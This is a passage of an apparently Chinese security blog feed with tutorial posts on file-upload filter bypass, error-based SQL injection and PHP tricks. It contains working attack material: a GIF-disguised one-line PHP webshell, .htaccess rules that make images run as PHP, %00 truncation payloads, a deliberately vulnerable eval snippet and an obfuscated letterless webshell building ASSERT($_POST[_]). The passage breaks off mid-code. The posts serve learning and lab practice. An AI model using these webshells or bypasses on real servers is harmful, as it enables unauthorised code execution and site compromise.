        <content type="html"><![CDATA[<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="上传检测流程"><a href="#上传检测流程" class="headerlink" title="上传检测流程"></a>上传检测流程</h2><p><img src="https://gitee.com/h1ler/blogimage/raw/master/img/20210425001426.png" alt="sum_up"></p><p><img src="https://gitee.com/h1ler/blogimage/raw/master/img/20210420012816.png" alt="image-20210420012816046"></p><h2 id="客户端检测绕过（JS）"><a href="#客户端检测绕过（JS）" class="headerlink" title="客户端检测绕过（JS）"></a>客户端检测绕过（JS）</h2><ul><li><p>如何判断是前端验证呢？</p><ul><li>抓包监听，如果上传文件的时候还没有抓取到数据包，但浏览器就提示文件类型不正确的话，那么多半就是前端校验了</li></ul></li><li><p>通常解法：</p><ul><li><p>抓包</p><ul><li>由于是前端校验，因此可以将shell.png重命名为shell.png 上传抓包时再将文件名修改为shell.php即可绕过前端限制，成功上传webshell。</li></ul></li><li><p>禁用JS</p></li><li><p>因为JS来校验文件后缀的原因，因此直接在浏览器上禁用JS即可。</p></li><li><p>方法</p><ul><li>firefox：按<strong>F12</strong>打开调试工具，再按<strong>F1</strong>打开设置选项<img src="https://gitee.com/h1ler/blogimage/raw/master/img/20210415224321.png" alt="image-20210415224247926"><ul><li>chrome在审查元素状态下可以找到<strong>Setting</strong>选项，然后在Debugger选项下面勾选<strong>Disable Javascript</strong>即可<img src="https://gitee.com/h1ler/blogimage/raw/master/img/20210415224547.png" alt="image-20210415224547644"></li></ul></li></ul></li><li><p>调试JS</p><ul><li>虽然这种解法没有必要，不过倒是学到了如何调试网页</li><li>firefox中F12打开开发者工具，在调试器中打开异常处暂停，修改js变量whitelist中的值即可<img src="https://gitee.com/h1ler/blogimage/raw/master/img/20210415231009.png" alt="image-20210415231009461"><ul><li>firefox中只能听过控制台输入var=value的形式更改变量的值</li><li>chrome中可直接修改</li></ul></li></ul></li></ul></li></ul><h2 id="服务端检测绕过（MIME）"><a href="#服务端检测绕过（MIME）" class="headerlink" title="服务端检测绕过（MIME）"></a>服务端检测绕过（MIME）</h2><ul><li><p>MIME检测原理</p><p>服务端MIME类型检测是通过检查http包的Content-Type字段中的值来判断上传文件是否合法的。</p></li><li><p>常见的MIME类型</p><pre><code>text/plain（纯文本）text/html（HTML文档）text/javascript（js代码）application/xhtml+xml（XHTML文档）image/gif（GIF图像）image/jpeg（JPEG图像）image/png（PNG图像）video/mpeg（MPEG动画）application/octet-stream（二进制数据）application/pdf（PDF文档）</code></pre></li><li><p>绕过方式：将content-type字段改为常见的image/jpg等即可成功上传</p></li></ul><h2 id="服务器检测绕过（目录路径检测）"><a href="#服务器检测绕过（目录路径检测）" class="headerlink" title="服务器检测绕过（目录路径检测）"></a>服务器检测绕过（目录路径检测）</h2><h3 id="00截断"><a href="#00截断" class="headerlink" title="- 00截断"></a>- 00截断</h3><ul><li><p>原理：PHP 内核是由 C 语言实现的，所以使用了 C 语言中的一些字符串处理函数。比如在连接字符串时候， 0 字节 (\x00) 将作为字符串结束符。所以在这个地方，攻击者只要在最后加入一个 0 字节，就能截断 file 变量之后的字符串</p></li><li><p>形成条件</p><ul><li>php版本要小于5.3.4</li><li>magic_quotes_gpc off</li></ul></li><li><p>在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束</p><p>比如</p><p><a href="https://mp.csdn.net/upfiles/?filename=test.txt" target="_blank" rel="noopener">https://mp.csdn.net/upfiles/?filename=test.txt</a>                                此时输出的是test.txt</p><p>加上%00</p><p><a href="https://mp.csdn.net/upfiles/?filename=test.php%00.txt" target="_blank" rel="noopener">https://mp.csdn.net/upfiles/?filename=test.php%00.txt</a>                   此时输出的是test.php</p><p>就绕过了后缀限制，可以上传webshell了</p></li><li><p>0x开头表示16进制，0在十六进制中是00, 0x00就是%00解码成的16进制</p></li><li><p>当执行move_uploaded_file($FILE[‘tmp_name’],$Path)时遇到0x00会自动截断，所以真正写入的实际地址是upload/a.php</p></li><li><p>案例一：</p><ul><li>此处是个POST包，在目录路径处构造完整路径用%00进行截断可以绕过随机重命名，并自定义为php文件进行解析<img src="https://gitee.com/h1ler/blogimage/raw/master/img/20210421134423.png" alt="image-20210421134423517"></li><li>自定义为a.php并添加%00进行截断<img src="https://gitee.com/h1ler/tuci/raw/master/null/20210421134718.png" alt="image-20210421134718342">此处截断需要将%00进行url编码才行<img src="https://gitee.com/h1ler/tuci/raw/master/null/20210421134823.png" alt="image-20210421134823317">编码后如图即可成功上传<img src="https://gitee.com/h1ler/tuci/raw/master/null/20210421135058.png" alt="image-20210421135058090"></li></ul></li><li><p>案例二</p><ul><li>随便上传一个文件后，url产生变化，此处可知其目录路径在url上传输<img src="https://gitee.com/h1ler/tuci/raw/master/null/20210421204028.png" alt="image-20210421204028019"></li><li>抓包如下<img src="https://gitee.com/h1ler/blogimage/raw/master/img/20210421203726.png" alt="image-20210421203726553"></li><li>同理进行改包截断<img src="https://gitee.com/h1ler/blogimage/raw/master/img/20210421205207.png" alt="image-20210421205207078"></li></ul></li><li><p>两个案例中用法不同</p><ul><li>案例一：POST包中%00不会被url解码，所有只能通过burp先行解码再传输，或者直接hex中修改为00进行截断</li><li>案例二：%00在被url解码之后是空字符</li></ul></li></ul><h2 id="服务端检测绕过（文件扩展名检测）"><a href="#服务端检测绕过（文件扩展名检测）" class="headerlink" title="服务端检测绕过（文件扩展名检测）"></a>服务端检测绕过（文件扩展名检测）</h2><h3 id="黑名单检测"><a href="#黑名单检测" class="headerlink" title="- 黑名单检测"></a>- 黑名单检测</h3><ul><li><p>名单列表绕过</p><p>默认情况下Apache 把 phtml、pht、php、php3、php4、php5 解析为 PHP，Fuzz一下找出黑名单里没有后缀进行攻击，比如asa或cer之类</p></li><li><p>文件名大小写绕过(至今尝试还未成功)</p><p>用AsP,pHp之类的文件名绕过黑名单检测</p></li><li><p>特殊文件名绕过</p><p>比如把http包里的文件名改为test.asp. 或test.asp空格,这种命名方式在windows中是不被允许的，也就是利用windows系统特性，绕过验证后，会被windows自动去掉后面的点或空格，但Unix/Linux没有这个特性</p></li><li><p>0x00截断绕过</p><p>据说在asp程序中遇到过，待学习</p></li><li><p>.htaccess文件攻击</p><ul><li>PHP  manual中提到<img src="https://gitee.com/h1ler/tuci/raw/master/null/20210421211503.png" alt="image-20210421211503751"></li><li>如果PHP安全没有配置好的话，就可以通过move_uploaded_file来overwrite服务器中的.htaccess文件,以此达到任意定义解析名单的目的，例如将jpg文件解析为php文件</li></ul></li><li><p>解析调用/漏洞绕过</p></li><li><p>常用一句话</p><pre class="line-numbers language-php"><code class="language-php">GIF89a<span class="token operator">?</span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span>shell<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h3 id="白名单检测"><a href="#白名单检测" class="headerlink" title="- 白名单检测"></a>- 白名单检测</h3><ul><li>0x00截断绕过</li><li>文件名长度绕过白名单</li><li>解析调用/漏洞绕过</li></ul><h2 id="服务端检测绕过（文件内容检测）"><a href="#服务端检测绕过（文件内容检测）" class="headerlink" title="服务端检测绕过（文件内容检测）"></a>服务端检测绕过（文件内容检测）</h2><h3 id="文件幻数检测"><a href="#文件幻数检测" class="headerlink" title="- 文件幻数检测"></a>- 文件幻数检测</h3><ul><li><p>主要时检测文件内容开始处的文件幻，比如图片类型的文件幻数如下</p></li><li><p>常见文件幻数</p><pre><code>jpg    FF D8 FF E0 00 10 4A 46 49 46GIF 47 49 46 38 39 61PNG 89 50 4E 47 0D 0A 1A 0A</code></pre></li></ul><h3 id="文件相关信息检测"><a href="#文件相关信息检测" class="headerlink" title="- 文件相关信息检测"></a>- 文件相关信息检测</h3><h3 id="文件加载检测"><a href="#文件加载检测" class="headerlink" title="- 文件加载检测"></a>- 文件加载检测</h3><h4 id="–-渲染-加载测试"><a href="#–-渲染-加载测试" class="headerlink" title="– 渲染/加载测试"></a>– 渲染/加载测试</h4><ul><li><p>绕过方式：代码注入（例如图片马）</p><p>用winhex看数据可以分析出这类工具的原理是在不破坏文件本身的渲染情况下找一个空白区进行填充代码，一般会是图片的注释区，对于渲染测试基本上都能绕过，毕竟本省的文件结构是完整的</p></li></ul><h4 id="–-二次渲染"><a href="#–-二次渲染" class="headerlink" title="– 二次渲染"></a>– 二次渲染</h4><ul><li><p><code>imagecreatefrom</code> 系列渲染图片都可能被绕过，有些特殊的图马是可以逃避过渲染的</p></li><li><p>绕过方式：</p><ul><li><p>GIF</p><p>渲染前后的两张GIF，没有发生变化的数据库部分直接插入Webshell即可</p><ol><li><p>准备一张GIF<img src="https://gitee.com/h1ler/blogimage/raw/master/img/16036176592096.gif" alt="16036176592096"></p></li><li><p>上传至目标网站上渲染一下再导出<img src="https://gitee.com/h1ler/blogimage/raw/master/img/20210503144509.png" alt="image-20210503144505868"></p></li><li><p>用010editor对比未变化区域插入webshell</p><p><img src="https://gitee.com/h1ler/tuci/raw/master/null/20210502154810.png" alt="image-20210502154810504"></p></li><li><p>由于测试网站存在文件包含漏洞，则可直接文件包含来执行攻击语句<img src="https://gitee.com/h1ler/blogimage/raw/master/img/20210502162601.png" alt="image-20210502162553895"></p></li></ol></li><li><p>PNG</p><p>PNG没有GIF那么简单，需要将数据写入到PLTE数据块或者IDAT数据块</p><ul><li>首先准备一个PNG图片<img src="https://gitee.com/h1ler/blogimage/raw/master/img/16036276956867.png" alt="img"></li><li>实现细节参考<a href="https://wooyun.x10sec.org/static/drops/tips-16034.html" target="_blank" rel="noopener">https://wooyun.x10sec.org/static/drops/tips-16034.html</a></li><li>写入 PLTE 数据块并不是对所有的 PNG 图片都是可行的，实验证明只有索引图像才可以成功插入 payload，灰度和真彩色图像均以失败告终</li><li>修改索引图像插入 PHP 代码的脚本项目地址为：<a href="https://github.com/hxer/imagecreatefrom-/blob/master/png/poc/poc_png.py" target="_blank" rel="noopener">Github - poc_png.py</a></li><li>因为值有索引图像的 PNG 才可能插入 PLTE 数据块，但是我们上面准备的 PNG 并不符合要求，得需要在 PS 里面将图片模式修改为索引颜色：</li></ul></li><li><p>JPG</p><p>JPG也需要使用脚本将数据插入到特定的数据库，而且可能会不成功，所以需要多次尝试</p></li></ul></li></ul><h2 id="解析攻击"><a href="#解析攻击" class="headerlink" title="解析攻击"></a>解析攻击</h2><h3 id="网络渗透的本质"><a href="#网络渗透的本质" class="headerlink" title="- 网络渗透的本质"></a>- 网络渗透的本质</h3><h3 id="直接解析"><a href="#直接解析" class="headerlink" title="- 直接解析"></a>- 直接解析</h3><h3 id="本地文件包含解析"><a href="#本地文件包含解析" class="headerlink" title="- 本地文件包含解析"></a>- 本地文件包含解析</h3><h3 id="htaccess文件上传解析漏洞"><a href="#htaccess文件上传解析漏洞" class="headerlink" title="- .htaccess文件上传解析漏洞"></a>- .htaccess文件上传解析漏洞</h3><ul><li><p>htaccess文件是<a href="https://baike.baidu.com/item/Apache" target="_blank" rel="noopener">Apache</a>服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页<a href="https://baike.baidu.com/item/301重定向" target="_blank" rel="noopener">301重定向</a>、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p></li><li><p>形成条件</p><ul><li>apache服务器</li><li>能够上传.htaccess文件，一般为<strong>黑名单</strong>限制</li><li>AllowOverride All，默认配置为关闭None</li><li>LoadModule rewrite_module modules/mod_rewrite.so #模块为开启状态</li><li>上传目录具有可执行权限</li></ul></li><li><p>.htaccess写法</p><pre><code>SetHandler application/x-httpd-php</code></pre><p>当前目录所有文件均会被解析为php文件</p><pre><code>&lt;FilesMatch "1"&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</code></pre><p>将文件名<strong>包含</strong>1的文件解析为php文件，可用作留后门，123.png 就会被解析成php</p><pre><code>AddType application/x-httpd-php .png</code></pre><p>将.png解析为php文件</p></li></ul><h3 id="web应用程序解析漏洞及其原理"><a href="#web应用程序解析漏洞及其原理" class="headerlink" title="- web应用程序解析漏洞及其原理"></a>- web应用程序解析漏洞及其原理</h3><h2 id="上传攻击框架"><a href="#上传攻击框架" class="headerlink" title="上传攻击框架"></a>上传攻击框架</h2><h3 id="轻量级检测绕过攻击"><a href="#轻量级检测绕过攻击" class="headerlink" title="- 轻量级检测绕过攻击"></a>- 轻量级检测绕过攻击</h3><h3 id="路径-扩展名检测绕过攻击"><a href="#路径-扩展名检测绕过攻击" class="headerlink" title="- 路径/扩展名检测绕过攻击"></a>- 路径/扩展名检测绕过攻击</h3><h3 id="文件内容性检测绕过攻击"><a href="#文件内容性检测绕过攻击" class="headerlink" title="- 文件内容性检测绕过攻击"></a>- 文件内容性检测绕过攻击</h3><h3 id="上传攻击框架-1"><a href="#上传攻击框架-1" class="headerlink" title="- 上传攻击框架"></a>- 上传攻击框架</h3><h2 id="代码逻辑"><a href="#代码逻辑" class="headerlink" title="代码逻辑"></a>代码逻辑</h2><h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="- 条件竞争"></a>- 条件竞争</h3><hr><blockquote><p>参考</p><ul><li><a href="https://www.sqlsec.com/2020/10/upload.html" target="_blank" rel="noopener">国光的文件上传靶场知识总结</a></li><li><a href="https://wenku.baidu.com/link?url=vMCO-E0_utuzonHcMnZ-xlRIW2M3Sn0sarHUKHIqQawrl2juefZOfJmFhdUCRah8EpO1NEUxJk7hm2lcpvz-apwev02IT-IWlKmDRzIid7u" target="_blank" rel="noopener">上传攻击总结</a></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 文件上传 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>报错注入详解</title>
      <link href="/2021/09/10/bao-cuo-zhu-ru-xiang-jie/"/>
      <url>/2021/09/10/bao-cuo-zhu-ru-xiang-jie/</url>
      
        <content type="html"><![CDATA[<h2 id="基于floor-的报错SQL语句"><a href="#基于floor-的报错SQL语句" class="headerlink" title="基于floor()的报错SQL语句"></a>基于floor()的报错SQL语句</h2><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span>concat<span class="token punctuation">(</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">group</span> <span class="token keyword">by</span> x<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>floor()函数</p><p>floor函数的作用是返回小于等于该值的最大整数,也可以理解为向下取整，只保留整数部分。</p></li><li><p>rand()函数</p><p>rand()函数可以用来生成0-1之间的随机数,但是rand(0)相当于给了rand()函数一个随机种子0,rand()生成的数字是随机的,而rand(0)是有规律的生成</p><p>rand()效果</p><p><img src="https://gitee.com/h1ler/blogimage/raw/master/img/image-20210524170954639.png" alt="image-20210524170954639"></p><p>rand(0)效果</p><p><img src="https://gitee.com/h1ler/blogimage/raw/master/img/image-20210524171023410.png" alt="image-20210524171023410"></p><p>利用rand(0)伪随机生成数字是有规律可循的,这也是采用rand(0)进行报错注入的原因,rand(0)是稳定的,而rand()则需要碰运气</p></li><li><p>floor(rand(0)*2)</p><p>rand()是返回0-1之间的随机数,则乘2后返回0-2之间的随机数,再配合floor()就可以产生0、1两个确定的数，大概产生的伪随机数序列为011011…</p></li><li><p>报错原理</p><blockquote><p>参考</p><p><a href="https://www.cnblogs.com/litlife/p/8472323.html" target="_blank" rel="noopener">https://www.cnblogs.com/litlife/p/8472323.html</a></p></blockquote></li></ul>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php黑魔法</title>
      <link href="/2021/09/10/php-hei-mo-fa/"/>
      <url>/2021/09/10/php-hei-mo-fa/</url>
      
        <content type="html"><![CDATA[<h2 id="当数组遇上string"><a href="#当数组遇上string" class="headerlink" title="当数组遇上string"></a>当数组遇上string</h2><p>由php手册我们知道</p><p>Array转换整型int/浮点型float会返回元素个数；</p><p>转换bool返回Array中是否有元素；转换成string返回’Array’，并抛出warning。</p><p>那么实际应用是怎样的呢？</p><pre class="line-numbers language-php"><code class="language-php"><span class="token shell-comment comment">#test.php</span><span class="token delimiter">&lt;?php</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[a-z0-9]/is'</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>要解决这个问题，就得构造无字母和数字的webshell</p><p>这里需要借助PHP中的另一个小技巧</p><p><img src="https://gitee.com/h1ler/blogimage/raw/master/img/image-20210524032255299.png" alt="image-20210524032255299"></p><p>即<code>'a'++='b'</code>,<code>'b'++='c'</code>…因此，我们只需要拿到一个字符<code>a</code>，通过自增操作即可获取a-Z中所有字符</p><p>那么如何拿到字符<code>a</code>呢？</p><p>巧了，数组(Array)的第一个字母就是大写A，而第4个字母就是小写a，即我们能同时拿到小写a和大写A</p><p>而在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串<code>Array</code><img src="https://gitee.com/h1ler/blogimage/raw/master/img/image-20210524032857554.png" alt="image-20210524032857554"></p><p>那么可构造如下webshell</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//最终构造Payload：ASSERT($_POST[_])</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span>@<span class="token string">"$_"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// $_='Array';</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token string">'!'</span><span class="token operator">==</span><span class="token string">'@'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// $_=$_[0];</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// A</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// S</span><span class="token variable">$___</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// S</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// E </span><span class="token variable">$___</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// R</span><span class="token variable">$___</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// T</span><span class="token variable">$___</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token operator">=</span><span class="token string">'_'</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// P</span><span class="token variable">$____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// O</span><span class="token variable">$____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// S</span><span class="token variable">$____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token 